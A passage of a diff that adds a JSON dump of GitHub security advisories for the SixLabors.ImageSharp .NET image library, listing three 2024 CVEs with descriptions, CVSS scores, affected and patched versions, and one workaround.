+          },
+          "patched_versions": "2.1.9",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 2.1.9"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.1.5",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 3.1.5"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 1,
+      "created_at": null,
+      "credits": [],
+      "credits_detailed": [],
+      "cve_id": "CVE-2024-32036",
+      "cvss": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.3,
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-226"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-226",
+          "name": "Sensitive Information in Resource Not Removed Before Reuse"
+        }
+      ],
+      "description": "### Impact\r\nA data leakage flaw was found in ImageSharp's JPEG and TGA decoders. This vulnerability is triggered when an attacker passes a specially crafted JPEG or TGA image file to a software using ImageSharp, potentially disclosing sensitive information from other parts of the software in the resulting image buffer.\r\n\r\n### Patches\r\nThe problem has been patched. All users are advised to upgrade to v3.1.4 or v2.1.8.\r\n\r\n### Workarounds\r\nNone\r\n\r\n### References\r\nNone\r\n",
+      "ghsa_id": "GHSA-5x7m-6737-26cr",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-5x7m-6737-26cr",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-5x7m-6737-26cr"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2024-32036"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2024-04-15T10:39:18Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "Buffers not cleared before reuse in SixLabors.ImageSharp",
+      "updated_at": "2024-04-15T16:50:38Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-5x7m-6737-26cr",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "2.1.8",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 2.1.8"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.1.4",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 3.1.4"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 5,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "skanejohan",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/4025939?v=4",
+            "events_url": "https://api.github.com/users/skanejohan/events{/privacy}",
+            "followers_url": "https://api.github.com/users/skanejohan/followers",
+            "following_url": "https://api.github.com/users/skanejohan/following{/other_user}",
+            "gists_url": "https://api.github.com/users/skanejohan/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/skanejohan",
+            "id": 4025939,
+            "login": "skanejohan",
+            "node_id": "MDQ6VXNlcjQwMjU5Mzk=",
+            "organizations_url": "https://api.github.com/users/skanejohan/orgs",
+            "received_events_url": "https://api.github.com/users/skanejohan/received_events",
+            "repos_url": "https://api.github.com/users/skanejohan/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/skanejohan/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/skanejohan/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/skanejohan",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2024-32035",
+      "cvss": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.3,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-789"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-789",
+          "name": "Memory Allocation with Excessive Size Value"
+        }
+      ],
+      "description": "### Impact\r\n_What kind of vulnerability is it? Who is impacted?_\r\n\r\nA vulnerability discovered in the ImageSharp library, where the processing of specially crafted files can lead to excessive memory usage in image decoders. The vulnerability is triggered when ImageSharp attempts to process image files that are designed to exploit this flaw. \r\n\r\nThis flaw can be exploited to cause a denial of service (DoS) by depleting process memory, thereby affecting applications and services that rely on ImageSharp for image processing tasks. Users and administrators are advised to update to the latest version of ImageSharp that addresses this vulnerability to mitigate the risk of exploitation.\r\n\r\n### Patches\r\n_Has the problem been patched? What versions should users upgrade to?_\r\n\r\nThe problem has been patched. All users are advised to upgrade to v3.1.4 or v2.1.8.\r\n\r\n### Workarounds\r\n\r\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\r\n\r\nBefore calling `Image.Decode(Async)`, use `Image.Identify` to determine the image dimensions in order to enforce a limit.\r\n\r\n### References\r\n_Are there any links users can visit to find out more_\r\n\r\n- ImageSharp: [Security Considerations](https://docs.sixlabors.com/articles/imagesharp/security.html)\r\n- ImageSharp.Web: [Securing Processing Commands](https://docs.sixlabors.com/articles/imagesharp.web/processingcommands.html#securing-processing-commands)",
+      "ghsa_id": "GHSA-g85r-6x2q-45w7",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-g85r-6x2q-45w7",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-g85r-6x2q-45w7"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2024-32035"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2024-04-15T10:39:00Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "Memory Allocation with Excessive Size Value in SixLabors.ImageSharp",
+      "updated_at": "2024-04-15T16:50:21Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-g85r-6x2q-45w7",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "2.1.8",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 2.1.8"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.1.4",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 3.1.4"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 1,
+      "created_at": null,
+      "credits": [],
+      "credits_detailed": [],
+      "cve_id": "CVE-2024-27929",
+      "cvss": {
+        "score": 7.1,
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 7.1,
+          "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-226"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-226",
+          "name": "Sensitive Information in Resource Not Removed Before Reuse"
+        }
+      ],
+      "description": "### Impact\r\nA heap-use-after-free flaw was found in ImageSharp's InitializeImage() function of PngDecoderCore.cs file. This vulnerability is triggered when an attacker passes a specially crafted PNG image file to ImageSharp for conversion, potentially leading to information disclosure.\r\n\r\n### Patches\r\nThe problem has been patched. All users are advised to upgrade to v3.1.3 or v2.1.7.\r\n\r\n### Workarounds\r\nNone\r\n\r\n### References\r\nNone\r\n",
+      "ghsa_id": "GHSA-65x7-c272-7g7r",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-65x7-c272-7g7r",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-65x7-c272-7g7r"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2024-27929"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2024-03-05T12:39:36Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "Use After Free in SixLabors.ImageSharp",
+      "updated_at": "2024-04-15T12:35:40Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-65x7-c272-7g7r",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.1.3",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "<= 3.1.2"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "2.1.7",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "<= 2.1.6"
+        }
+      ],
+      "withdrawn_at": null
+    }
+  ],
+  "query": {
+    "repository_full_name": "SixLabors/ImageSharp",
+    "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories?per_page=100&page=1"
+  },
+  "retrieved_at": "2026-10-21T13:24:44.670373+00:00",
+  "tool": "github_rest_readonly"
+}
